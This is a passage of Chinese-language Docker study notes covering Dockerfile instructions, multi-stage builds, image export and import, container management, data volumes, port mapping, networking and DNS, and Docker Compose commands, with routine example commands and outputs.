指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 docker build 中用 --build-arg <参数名>=<值> 来覆盖。\n\n\n\n- VOLUME 定义匿名卷\n\n格式为：\n\n- VOLUME [\"<路径1>\", \"<路径2>\"...]\n- VOLUME <路径>\n\n为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 Dockerfile 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。\n\n    VOLUME /data\n\n\n\n这里的 /data 目录就会在运行时自动挂载为匿名卷，任何向 /data 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行时可以覆盖这个挂载设置。比如：\n\n    docker run -d -v mydata:/data xxxx\n\n 在这行命令中，就使用了 mydata 这个命名卷挂载到了 /data 这个位置，替代了 Dockerfile 中定义的匿名卷的挂载配置。 \n\n\n\n- EXPOSE 声明端口\n\n格式为 EXPOSE <端口1> [<端口2>...]。\n\nEXPOSE 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 docker run -P时，会自动随机映射 EXPOSE 的端口。\n\n\n\n要将 EXPOSE 和在运行时使用 -p <宿主端口>:<容器端口> 区分开来。-p，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而 EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。\n\n\n\n- WORKDIR 指定工作目录\n\n格式为 WORKDIR <工作目录路径>。\n\n使用 WORKDIR 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，WORKDIR 会帮你建立目录。\n\n\n\n之前提到一些初学者常犯的错误是把 Dockerfile 等同于 Shell 脚本来书写，这种错误的理解还可能会导致出现下面这样的错误：\n\n    RUN cd /app\n    RUN echo \"hello\" > world.txt\n\n如果将这个 Dockerfile 进行构建镜像运行后，会发现找不到 /app/world.txt 文件，或者其内容不是 hello。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 Dockerfile 中， 这两行 RUN 命令的执行环境根本不同，是两个完全不同的容器。这就是对 Dockerfile 构建分层存储的概念不了解所导致的错误。\n\n\n\n之前说过每一个 RUN 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 RUN cd /app 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。\n\n因此如果需要改变以后各层的工作目录的位置，那么应该使用 WORKDIR 指令。\n\n \n\n- USER 指定当前用户\n\n格式：USER <用户名>\n\nUSER 指令和 WORKDIR 相似，都是改变环境状态并影响以后的层。WORKDIR 是改变工作目录，USER则是改变之后层的执行 RUN, CMD 以及 ENTRYPOINT 这类命令的身份。\n\n\n\n当然，和 WORKDIR 一样，USER 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。\n\n    RUN groupadd -r redis && useradd -r -g redis redis\n    USER redis\n    RUN [ \"redis-server\" ]\n\n \n\n\n如果以 root 执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程，不要使用 su 或者 sudo，这些都需要比较麻烦的配置，而且在 TTY 缺失的环境下经常出错。建议使用 gosu。\n\n    # 建立 redis 用户，并使用 gosu 换另一个用户执行命令\n    RUN groupadd -r redis && useradd -r -g redis redis\n    # 下载 gosu\n    RUN wget -O /usr/local/bin/gosu \"https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64\" \\\n        && chmod +x /usr/local/bin/gosu \\\n        && gosu nobody true\n    # 设置 CMD，并以另外的用户执行\n    CMD [ \"exec\", \"gosu\", \"redis\", \"redis-server\" ]\n\n\n\n- HEALTHCHECK 健康检查\n\n格式：\n\n- HEALTHCHECK [选项] CMD <命令>：设置检查容器健康状况的命令\n- HEALTHCHECK NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令\n\n而自 1.12 之后，Docker 提供了 HEALTHCHECK 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。\n\n 当在一个镜像指定了 HEALTHCHECK 指令后，用其启动容器，初始状态会为 starting，在 HEALTHCHECK 指令检查成功后变为 healthy，如果连续一定次数失败，则会变为 unhealthy。\n\n \n\nHEALTHCHECK 支持下列选项：\n\n- --interval=<间隔>：两次健康检查的间隔，默认为 30 秒；\n- --timeout=<时长>：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；\n- --retries=<次数>：当连续失败指定次数后，则将容器状态视为 unhealthy，默认 3 次。\n\n和 CMD, ENTRYPOINT 一样，HEALTHCHECK 只可以出现一次，如果写了多个，只有最后一个生效。\n\n \n\n假设我们有个镜像是个最简单的 Web 服务，我们希望增加健康检查来判断其 Web 服务是否在正常工作，我们可以用 curl 来帮助判断，其 Dockerfile 的 HEALTHCHECK 可以这么写：\n\n    FROM nginx\n    RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*\n    HEALTHCHECK --interval=5s --timeout=3s \\\n      CMD curl -fs http://localhost/ || exit 1\n\n \n\n\n- ONBUILD 为他人做嫁衣裳\n\n格式：ONBUILD <其它指令>。\n\nONBUILD 是一个特殊的指令，它后面跟的是其它指令，比如 RUN, COPY 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。\n\nDockerfile 中的其它指令都是为了定制当前镜像而准备的，唯有 ONBUILD 是为了帮助别人定制自己而准备的。\n\n \n\n2.4 docker多阶段构建 (多个 FROM as)\n\n我们构建 Docker 镜像时，一种方式是将所有的构建过程编包含在一个 Dockerfile 中，包括项目及其依赖库的编译、测试、打包等流程，这里可能会带来的一些问题：\n\n- Dockerfile 特别长，可维护性降低\n- 镜像层次多，镜像体积较大，部署时间变长\n- 源代码存在泄露的风险\n  \n\nDocker v17.05 开始支持多阶段构建 (multistage builds)。\n\n编写 Dockerfile 文件\n\n    FROM golang:1.9-alpine as builder\n    \n    RUN apk --no-cache add git\n    \n    WORKDIR /go/src/github.com/go/helloworld/\n    \n    RUN go get -d -v github.com/go-sql-driver/mysql\n    \n    COPY app.go .\n    \n    RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .\n    \n    FROM alpine:latest as prod\n    \n    RUN apk --no-cache add ca-certificates\n    \n    WORKDIR /root/\n    \n    COPY --from=0 /go/src/github.com/go/helloworld/app .\n    \n    CMD [\"./app\"]\n\n构建镜像\n\n    $ docker build -t go/helloworld:3 .\n\n\n\n- 只构建某一阶段的镜像\n\n我们可以使用 as 来为某一阶段命名，例如\n\n    FROM golang:1.9-alpine as builder\n\n例如当我们只想构建 builder 阶段的镜像时，我们可以在使用 docker build 命令时加上 --target参数即可\n\n    $ docker build --target builder -t username/imagename:tag .\n\n\n\n- 构建时从其他镜像复制文件\n\n上面例子中我们使用 COPY --from=0 /go/src/github.com/go/helloworld/app . 从上一阶段的镜像中复制文件，我们也可以复制任意镜像中的文件。\n\n    $ COPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf\n\n\n\n2.5 其它制作镜像的方式\n\n\n\n- docker save 和 docker load\n\nDocker 还提供了 docker load 和 docker save 命令，用以将镜像保存为一个 tar 文件，然后传输到另一个位置上，再加载进来。这是在没有 Docker Registry 时的做法，现在已经不推荐，镜像迁移应该直接使用 Docker Registry，无论是直接使用 Docker Hub 还是使用内网私有 Registry 都可以。\n\n\n\n- 保存镜像\n\n使用 docker save 命令可以将镜像保存为归档文件。\n\n比如我们希望保存这个 alpine 镜像。\n\n    $ docker image ls alpine\n    REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\n    alpine              latest              baa5d63471ea        5 weeks ago         4.803 MB\n\n保存镜像的命令为：\n\n    $ docker save alpine | gzip > alpine-latest.tar.gz\n\n然后我们将 alpine-latest.tar.gz 文件复制到了到了另一个机器上，可以用下面这个命令加载镜像：\n\n    $ docker load -i alpine-latest.tar.gz\n    Loaded image: alpine:latest\n\n \n\n\n如果我们结合这两个命令以及 ssh 甚至 pv 的话，利用 Linux 强大的管道，我们可以写一个命令完成从一个机器将镜像迁移到另一个机器，并且带进度条的功能：\n\n    docker save <镜像名> | bzip2 | pv | ssh <用户名>@<主机名> 'cat | docker load'\n\n\n\n- docker export save 区别\n\n- docker save是将一个镜像导出成一个tarball文件，对应的导入命令是docker load，将该文件导入成一个镜像。 \n- docker export是将一个容器导出成一个tarball文件，对应的导入命令时docker import，将该文件导入成一个镜像（注意不是容器）。  容器快照将会丢弃所有的历史记录和元数据信息\n\n\n\n3. 操作容器\n\n3.1 新建并启动 \n\n所需要的命令主要为 docker run。\n\n    $ docker run -t -i ubuntu:14.04 /bin/bash\n    root@af8bae53bdd3:/#\n\n其中，-t 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， -i 则让容器的标准输入保持打开。\n\n\n\n当利用 docker run 来创建容器时，Docker 在后台运行的标准操作包括：\n\n- 检查本地是否存在指定的镜像，不存在就从公有仓库下载\n- 利用镜像创建并启动一个容器\n- 分配一个文件系统，并在只读的镜像层外面挂载一层可读写层\n- 从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去\n- 从地址池配置一个 ip 地址给容器\n- 执行用户指定的应用程序\n- 执行完毕后容器被终止\n\n\n\n3.2 启动已终止容器\n\n可以利用 docker container start 命令，直接将一个已经终止的容器启动运行。\n\n\n\n3.3 后台运行\n\n更多的时候，需要让 Docker 在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 -d 参数来实现。\n\n     docker run -d ubuntu:17.10 /bin/sh -c \"while true; do echo hello world; sleep 1; done\"\n    77b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a\n\n此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 docker logs查看)。\n\n\n\n要获取容器的输出信息，可以通过 docker container logs 命令。\n\n    docker container logs [container ID or NAMES]\n    hello world\n    hello world\n    hello world\n    . . .\n\n\n\n3.4 终止容器\n\n可以使用 docker container stop 来终止一个运行中的容器。\n\n \n\n3.5 进入容器\n\ndocker exec 后边可以跟多个参数，这里主要说明 -i -t 参数。\n\n只用 -i 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。\n\n当 -i -t 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。\n\n\n\n    docker exec -it 69d1 bash\n    root@69d137adef7a:/#\n\n\n\n3.6 导出容器\n\n如果要导出本地某个容器，可以使用 docker export 命令。\n\n    docker export 7691a814370e > ubuntu.tar\n\n这样将导出容器快照到本地文件。\n\n\n\n3.7 导入容器快照\n\n    $ cat ubuntu.tar | docker import - test/ubuntu:v1.0\n    $ docker image ls\n    REPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE\n    test/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB\n\n\n\n此外，也可以通过指定 URL 或者某个目录来导入，例如\n\n    $ docker import http://example.com/exampleimage.tgz example/imagerepo\n\n\n\n注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。 \n\n\n\n3.8 删除容器\n\n可以使用 docker container rm 来删除一个处于终止状态的容器。例如\n\n    $ docker container rm  trusting_newton\n    trusting_newton\n\n\n\n3.9 清理所有处于终止状态的容器\n\n    $ docker container prune\n\n\n\n4. 访问仓库\n\n4.1 Docker Hub\n\n你可以在 https://cloud.docker.com 免费注册一个 Docker 账号。\n\n可以通过执行 docker login 命令交互式的输入用户名及密码来完成在命令行界面登录 Docker Hub。\n\n你可以通过 docker logout 退出登录。\n\n\n\n4.2 拉取镜像\n\n你可以通过 docker search 命令来查找官方仓库中的镜像，并利用 docker pull 命令来将它下载到本地。\n\n\n\n一种是类似 centos 这样的镜像，被称为基础镜像或根镜像。这些基础镜像由 Docker 公司创建、验证、支持、提供。这样的镜像往往使用单个单词作为名字。\n\n还有一种类型，比如 tianon/centos 镜像，它是由 Docker 的用户创建并维护的，往往带有用户名称前缀。可以通过前缀 username/ 来指定使用某个用户提供的镜像，比如 tianon 用户。\n\n\n\n4.3 推送镜像\n\n用户也可以在登录后通过 docker push 命令来将自己的镜像推送到 Docker Hub。\n\n    $ docker tag ubuntu:17.10 username/ubuntu:17.10\n    \n    $ docker image ls\n    \n    REPOSITORY                                               TAG                    IMAGE ID            CREATED             SIZE\n    ubuntu                                                   17.10                  275d79972a86        6 days ago          94.6MB\n    username/ubuntu                                          17.10                  275d79972a86        6 days ago          94.6MB\n    \n    $ docker push username/ubuntu:17.10\n    \n    $ docker search username\n    \n    NAME                      DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED\n    username/ubuntu\n\n\n\n4.4 自动创建\n\n有时候，用户创建了镜像，安装了某个软件，如果软件发布新版本则需要手动更新镜像。\n\n而自动创建允许用户通过 Docker Hub 指定跟踪一个目标网站（目前支持 GitHub 或 BitBucket）上的项目，一旦项目发生新的提交或者创建新的标签（tag），Docker Hub 会自动构建镜像并推送到 Docker Hub 中。\n\n \n\n要配置自动创建，包括如下的步骤：\n\n- 创建并登录 Docker Hub，以及目标网站；\n- 在目标网站中连接帐户到 Docker Hub；\n- 在 Docker Hub 中 配置一个自动创建；\n- 选取一个目标网站中的项目（需要含 Dockerfile）和分支；\n- 指定 Dockerfile 的位置，并提交创建。\n\n之后，可以在 Docker Hub 的 自动创建页面 中跟踪每次创建的状态。\n\n\n\n4.5 私有仓库\n\ndocker-registry 是官方提供的工具，可以用于构建私有的镜像仓库。\n\n\n\n\n\n5. 数据管理\n\n5.1 数据卷\n\n 数据卷 是一个可供一个或多个容器使用的特殊目录，它绕过 UFS，可以提供很多有用的特性：\n\n- 数据卷 可以在容器之间共享和重用\n- 对 数据卷 的修改会立马生效\n- 对 数据卷 的更新，不会影响镜像\n- 数据卷 默认会一直存在，即使容器被删除\n\n注意：数据卷 的使用，类似于 Linux 下对目录或文件进行 mount，镜像中的被指定为挂载点的目录中的文件会隐藏掉，能显示看的是挂载的 数据卷。\n\n\n\n5.2 选择 -v 还是 -–mount 参数\n\nDocker 新用户应该选择 --mount 参数，经验丰富的 Docker 使用者对 -v 或者 --volume 已经很熟悉了，但是推荐使用 --mount 参数。\n\n\n\n5.3 创建一个数据卷\n\n    $ docker volume create my-vol\n\n\n\n查看所有的 数据卷\n\n    $ docker volume ls\n    \n    local               my-vol\n\n\n\n在主机里使用以下命令可以查看指定 数据卷 的信息\n\n    $ docker volume inspect my-vol\n    [\n        {\n            \"Driver\": \"local\",\n            \"Labels\": {},\n            \"Mountpoint\": \"/var/lib/docker/volumes/my-vol/_data\",\n            \"Name\": \"my-vol\",\n            \"Options\": {},\n            \"Scope\": \"local\"\n        }\n    ]\n\n\n\n5.4 启动一个挂载数据卷的容器\n\n 在用 docker run 命令的时候，使用 --mount 标记来将 数据卷 挂载到容器里。在一次 docker run中可以挂载多个 数据卷。\n\n\n\n下面创建一个名为 web 的容器，并加载一个 数据卷 到容器的 /webapp 目录。\n\n \n\n    $ docker run -d -P \\\n        --name web \\\n        --mount source=my-vol,target=/webapp \\ \t\t\t\t(相似) # -v my-vol:/wepapp \\\n        training/webapp \\\n        python app.py\n\n\n\n5.5 查看数据卷的具体信息\n\n在主机里使用以下命令可以查看 web 容器的信息\n\n    $ docker inspect web\n\n\n\n数据卷 信息在 \"Mounts\" Key 下面\n\n    \"Mounts\": [\n        {\n            \"Type\": \"volume\",\n            \"Name\": \"my-vol\",\n            \"Source\": \"/var/lib/docker/volumes/my-vol/_data\",\n            \"Destination\": \"/app\",\n            \"Driver\": \"local\",\n            \"Mode\": \"\",\n            \"RW\": true,\n            \"Propagation\": \"\"\n        }\n    ],\n\n\n\n5.6 删除数据卷\n\n    $ docker volume rm my-vol\n\n\n\n数据卷 是被设计用来持久化数据的，它的生命周期独立于容器，Docker 不会在容器被删除后自动删除 数据卷，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的 数据卷。如果需要在删除容器的同时移除数据卷。可以在删除容器的时候使用 docker rm -v 这个命令。\n\n\n\n 无主的数据卷可能会占据很多空间，要清理请使用以下命令\n\n    $ docker volume prune\n\n\n\n5.7 挂载一个主机目录作为数据卷\n\n使用 --mount 标记可以指定挂载一个本地主机的目录到容器中去。\n\n    $ docker run -d -P \\\n        --name web \\\n        # -v /src/webapp:/opt/webapp \\\n        --mount type=bind,source=/src/webapp,target=/opt/webapp \\\n        training/webapp \\\n        python app.py\n\n上面的命令加载主机的 /src/webapp 目录到容器的 /opt/webapp目录。这个功能在进行测试的时候十分方便，比如用户可以放置一些程序到本地目录中，来查看容器是否正常工作。本地目录的路径必须是绝对路径，以前使用 -v 参数时如果本地目录不存在 Docker 会自动为你创建一个文件夹，现在使用 --mount参数时如果本地目录不存在，Docker 会报错\n\n\n\nDocker 挂载主机目录的默认权限是 读写，用户也可以通过增加 readonly 指定为 只读。\n\n \n\n    $ docker run -d -P \\\n        --name web \\\n        # -v /src/webapp:/opt/webapp:ro \\\n        --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \\\n        training/webapp \\\n        python app.py\n\n加了 readonly 之后，就挂载为 只读 了。如果你在容器内 /opt/webapp 目录新建文件，会显示如下错误\n\n    /opt/webapp # touch new.txt\n    touch: new.txt: Read-only file system\n\n\n\n5.8 查看数据卷的具体信息\n\n在主机里使用以下命令可以查看 web 容器的信息\n\n    $ docker inspect web\n\n挂载主机目录 的配置信息在 \"Mounts\" Key 下面\n\n    \"Mounts\": [\n        {\n            \"Type\": \"bind\",\t\t\t#此处为 bind\n            \"Source\": \"/src/webapp\",\n            \"Destination\": \"/opt/webapp\",\n            \"Mode\": \"\",\n            \"RW\": true,\n            \"Propagation\": \"rprivate\"\n        }\n    ],\n\n\n\n5.9 挂载一个本地主机文件作为数据卷\n\n--mount 标记也可以从主机挂载单个文件到容器中\n\n    $ docker run --rm -it \\\n       # -v $HOME/.bash_history:/root/.bash_history \\\n       --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \\\n       ubuntu:17.10 \\\n       bash\n    \n    root@2affd44b4667:/# history\n    1  ls\n    2  diskutil list\n\n这样就可以记录在容器输入过的命令了。\n\n\n\n6. 使用网络\n\n6.1 外部访问容器\n\n容器中可以运行一些网络应用，要让外部也可以访问这些应用，可以通过 -P 或 -p 参数来指定端口映射。\n\n当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。\n\n\n\n使用 docker container ls 可以看到，本地主机的 49155 被映射到了容器的 5000 端口。此时访问本机的 49155 端口即可访问容器内 web 应用提供的界面。\n\n    $ docker run -d -P training/webapp python app.py\n    \n    $ docker container ls -l\n    CONTAINER ID  IMAGE                   COMMAND       CREATED        STATUS        PORTS                    NAMES\n    bc533791f3f5  training/webapp:latest  python app.py 5 seconds ago  Up 2 seconds  0.0.0.0:49155->5000/tcp  nostalgic_morse\n\n \n\n\n-p 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 \n\nip:hostPort:containerPort | ip::containerPort | hostPort:containerPort。\n\n\n\n6.2 映射所有接口地址 \n\n使用 hostPort:containerPort 格式本地的 5000 端口映射到容器的 5000 端口，可以执行\n\n    $ docker run -d -p 5000:5000 training/webapp python app.py\n\n此时默认会绑定本地所有接口上的所有地址。\n\n\n\n6.3 映射到指定地址的指定端口  \n\n可以使用 ip:hostPort:containerPort 格式指定映射使用一个特定地址，比如 localhost 地址 127.0.0.1\n\n    $ docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py\n\n\n\n6.4 映射到指定地址的任意端口\n\n使用 ip::containerPort 绑定 localhost 的任意端口到容器的 5000 端口，本地主机会自动分配一个端口。\n\n    $ docker run -d -p 127.0.0.1::5000 training/webapp python app.py\n\n\n\n还可以使用 udp 标记来指定 udp 端口\n\n    $ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py\n\n\n\n6.5 查看映射端口配置\n\n 使用 docker port 来查看当前映射的端口配置，也可以查看到绑定的地址\n\n    $ docker port nostalgic_morse 5000\n    127.0.0.1:49155.\n\n\n\n\n- 容器有自己的内部网络和 ip 地址（使用 docker inspect 可以获取所有的变量，Docker 还可以有一个可变的网络配置。）\n- -p 标记可以多次使用来绑定多个端口\n\n例如\n\n    $ docker run -d \\\n        -p 5000:5000 \\\n        -p 3000:80 \\\n        training/webapp \\\n        python app.py\n\n\n\n6.7 容器互联\n\n- 新建网络\n\n 下面先创建一个新的 Docker 网络。\n\n    $ docker network create -d bridge my-net\n\n-d 参数指定 Docker 网络类型，有 bridge overlay。其中 overlay 网络类型用于 Swarm mode\n\n\n\n- 连接容器\n\n运行一个容器并连接到新建的 my-net 网络\n\n    $ docker run -it --rm --name busybox1 --network my-net busybox sh\n\n\n\n打开新的终端，再运行一个容器并加入到 my-net 网络\n\n    $ docker run -it --rm --name busybox2 --network my-net busybox sh\n\n\n\n再打开一个新的终端查看容器信息\n\n    $ docker container ls\n    \n    CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n    b47060aca56b        busybox             \"sh\"                11 minutes ago      Up 11 minutes                           busybox2\n    8720575823ec        busybox             \"sh\"                16 minutes ago      Up 16 minutes                           busybox1\n\n\n\n下面通过 ping 来证明 busybox1 容器和 busybox2 容器建立了互联关系。\n\n在 busybox1 容器输入以下命令\n\n    / # ping busybox2\n    PING busybox2 (172.19.0.3): 56 data bytes\n    64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms\n    64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms\n\n\n\n用 ping 来测试连接 busybox2 容器，它会解析成 172.19.0.3。\n\n同理在 busybox2 容器执行 ping busybox1，也会成功连接到。\n\n    / # ping busybox1\n    PING busybox1 (172.19.0.2): 56 data bytes\n    64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms\n    64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms\n\n这样，busybox1 容器和 busybox2 容器建立了互联关系。\n\n如果你有多个容器之间需要互相连接，推荐使用 Docker Compose。\n\n\n\n6.8 配置 DNS\n\n 如何自定义配置容器的主机名和 DNS 呢？秘诀就是 Docker 利用虚拟文件来挂载容器的 3 个相关配置文件。\n\n在容器中使用 mount 命令可以看到挂载信息：\n\n    $ mount\n    /dev/disk/by-uuid/1fec...ebdf on /etc/hostname type ext4 ...\n    /dev/disk/by-uuid/1fec...ebdf on /etc/hosts type ext4 ...\n    tmpfs on /etc/resolv.conf type tmpfs ...\n\n这种机制可以让宿主主机 DNS 信息发生更新后，所有 Docker 容器的 DNS 配置通过 /etc/resolv.conf文件立刻得到更新。\n\n配置全部容器的 DNS ，也可以在 /etc/docker/daemon.json 文件中增加以下内容来设置。\n\n    {\n      \"dns\" : [\n        \"114.114.114.114\",\n        \"8.8.8.8\"\n      ]\n    } \n\n\n\n如果用户想要手动指定容器的配置，可以在使用 docker run 命令启动容器时加入如下参数：\n\n -h HOSTNAME 或者 --hostname=HOSTNAME 设定容器的主机名，它会被写到容器内的 /etc/hostname和 /etc/hosts。但它在容器外部看不到，既不会在 docker container ls 中显示，也不会在其他的容器的 /etc/hosts 看到。\n\n\n\n--dns=IP_ADDRESS 添加 DNS 服务器到容器的 /etc/resolv.conf 中，让容器用这个服务器来解析所有不在 /etc/hosts 中的主机名。\n\n\n\n--dns-search=DOMAIN 设定容器的搜索域，当设定搜索域为 .example.com 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 host.example.com。\n\n\n\n注意：如果在容器启动时没有指定最后两个参数，Docker 会默认用主机上的 /etc/resolv.conf 来配置容器。\n\n\n\n\n\n7. 高级网络配置 TODO:\n\n\n\n8. Docker Compose(组成) 项目\n\n8.1 Compose 简介\n\nCompose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排。\n\n\n\n在日常工作中，经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 Web 项目，除了 Web 服务容器本身，往往还需要再加上后端的数据库服务容器，甚至还包括负载均衡容器等。\n\n\n\nCompose 恰好满足了这样的需求。它允许用户通过一个单独的 docker-compose.yml 模板文件（YAML 格式）来\t定义一组相关联的应用容器为一个项目（project）。\n\n \n\nCompose 中有两个重要的概念：\n\n- 服务 (service)：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。\n- 项目 (project)：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义。\n\n\n\n一个项目可以由多个服务（容器）关联而成，Compose 面向项目进行管理。\n\n\n\n8.2 安装与卸载\n\n- Compose 可以通过 Python 的包管理工具 pip 进行安装\n- 也可以直接下载编译好的二进制文件使用\n- 甚至能够直接在 Docker 容器中运行\n\n前两种方式是传统方式，适合本地环境下安装使用；最后一种方式则不破坏系统环境，更适合云计算场景。\n\n    $ docker-compose --version\n    docker-compose version 1.21.0, build 5920eb0\n\n\n\n8.3 Compose 命令说明使用\n\n对于 Compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到命令影响。\n\n \n\ndocker-compose 命令的基本的使用格式是\n\n    docker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n\n \n\n\n命令选项\n\n- -f, --file FILE 指定使用的 Compose 模板文件，默认为 docker-compose.yml，可以多次指定。\n- -p, --project-name NAME 指定项目名称，默认将使用所在目录名称作为项目名。\n- --x-networking 使用 Docker 的可拔插网络后端特性\n- --x-network-driver DRIVER 指定网络后端的驱动，默认为 bridge\n- --verbose 输出更多调试信息。\n- -v, --version 打印版本并退出。\n\n \n\n命令使用说明\n\n\n\n8.1 build 构建（重新构建）项目中的服务容器\n\n格式为 docker-compose build [options] [SERVICE...]。\n\n服务容器一旦构建后，将会带上一个标记名，例如对于 web 项目中的一个 db 容器，可能是 web_db。\n\n可以随时在项目目录下运行 docker-compose build 来重新构建服务。\n\n选项包括：\n\n- --force-rm 删除构建过程中的临时容器。\n- --no-cache 构建镜像过程中不使用 cache（这将加长构建过程）。\n- --pull 始终尝试通过 pull 来获取更新版本的镜像。\n\n\n\n8.2 config 验证 Compose 文件格式是否正确，若正确则显示配置，若格式错误显示错误原因\n\n\n\n8.3 down 此命令将会停止 up 命令所启动的容器，并移除网络\n\n\n\n8.4 exec 进入指定的容器\n\n\n\n8.5 help 获得一个命令的帮助\n\n\n\n8.6 images 列出 Compose 文件中包含的镜像\n\n\n\n8.7 kill 通过发送 SIGKILL 信号来强制停止服务容器\n\n格式为 docker-compose kill [options] [SERVICE...]。\n\n支持通过 -s 参数来指定发送的信号，例如通过如下指令发送 SIGINT 信号。\n\n    $ docker-compose kill -s SIGINT\n\n\n\n8.8 logs 查看服务容器的输出\n\n格式为 docker-compose logs [options] [SERVICE...]。\n\n默认情况下，docker-compose 将对不同的服务输出使用不同的颜色来区分。可以通过 --no-color 来关闭颜色。\n\n该命令在调试问题的时候十分有用。\n\n\n\n8.9 pause 暂停一个服务容器\n\n格式为 docker-compose pause [SERVICE...]。\n\n\n\n8.10 port 打印某个容器端口所映射的公共端口\n\n格式为 docker-compose port [options] SERVICE PRIVATE_PORT。\n\n选项：\n\n- --protocol=proto 指定端口协议，tcp（默认值）或者 udp。\n- --index=index 如果同一服务存在多个容器，指定命令对象容器的序号（默认为 1）。\n  \n\n8.11 ps 列出项目中目前的所有容器\n\n格式为 docker-compose ps [options] [SERVICE...]。\n\n选项：\n\n- -q 只打印容器的 ID 信息。\n\n\n\n8.12 pull 拉取服务依赖的镜像\n\n格式为 docker-compose pull [options] [SERVICE...]。\n\n选项：\n\n- --ignore-pull-failures 忽略拉取镜像过程中的错误。\n\n\n\n8.13 push 推送服务依赖的镜像到 Docker 镜像仓库\n\n\n\n8.14 restart 重启项目中的服务\n\n格式为 docker-compose restart [options] [SERVICE...]。\n\n选项：\n\n- -t, --timeout TIMEOUT 指定重启前停止容器的超时（默认为 10 秒）。\n\n\n\n8.15 rm 删除所有（停止状态的）服务容器\n\n推荐先执行 docker-compose stop 命令来停止容器。\n\n格式为 docker-compose rm [options] [SERVICE...]。\n\n选项：\n\n- -f, --force 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n- -v 删除容器所挂载的数据卷。\n\n \n\n8.16 run 在指定服务上执行一个命令\n\n格式为 docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]。\n\n例如：\n\n    $ docker-compose run ubuntu ping docker.com\n\n将会启动一个 ubuntu 服务容器，并执行 ping docker.com 命令。\n\n默认情况下，如果存在关联，则所有关联的服务将会自动被启动，除非这些服务已经在运行中。\n\n\n\n该命令类似启动容器后运行指定的命令，相关卷、链接等等都将会按照配置自动创建。\n\n两个不同点：\n\n- 给定命令将会覆盖原有的自动运行命令；\n- 不会自动创建端口，以避免冲突。\n\n如果不希望自动启动关联的容器，可以使用 --no-deps 选项，例如\n\n    $ docker-compose run --no-deps web python manage.py shell\n\n将不会启动 web 容器所关联的其它容器。\n\n选项：\n\n- -d 后台运行容器。\n- --name NAME 为容器指定一个名字。\n- --entrypoint CMD 覆盖默认的容器启动指令。\n- -e KEY=VAL 